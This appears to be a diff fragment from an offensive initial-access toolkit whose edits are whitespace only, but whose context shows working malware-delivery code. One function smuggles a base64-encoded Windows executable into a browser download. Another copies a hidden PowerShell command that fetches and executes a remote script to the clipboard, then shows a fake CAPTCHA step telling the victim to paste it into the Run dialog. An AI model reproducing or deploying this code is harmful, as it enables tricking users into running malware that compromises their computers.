@@ -53,7 +53,7 @@ outputs: [initial_foothold, delivery_report]
 <script>
 function smuggle() {
     var bin = atob("TVqQAAMAAAAEAAAA..."); // base64 PE
-    var blob = new Blob([new Uint8Array([...bin].map(c=>c.charCodeAt(0)))],
+    var blob = new Blob([new Uint8Array([...bin].map(c=>c.charCodeAt(0)))], 
                         {type: 'application/octet-stream'});
     var url = URL.createObjectURL(blob);
     var a = document.createElement('a');
@@ -205,7 +205,7 @@ function copyPayload() {
     navigator.clipboard.writeText(
         'powershell -w hidden -ep bypass -c "IEX(IWR https://cdn.legit-looking.com/update.ps1)"'
     );
-    document.querySelector('.captcha-container').innerHTML =
+    document.querySelector('.captcha-container').innerHTML = 
         '<p>✓ Verification step 2: Press Win+R, paste (Ctrl+V), press Enter</p>';
 }
 </script>
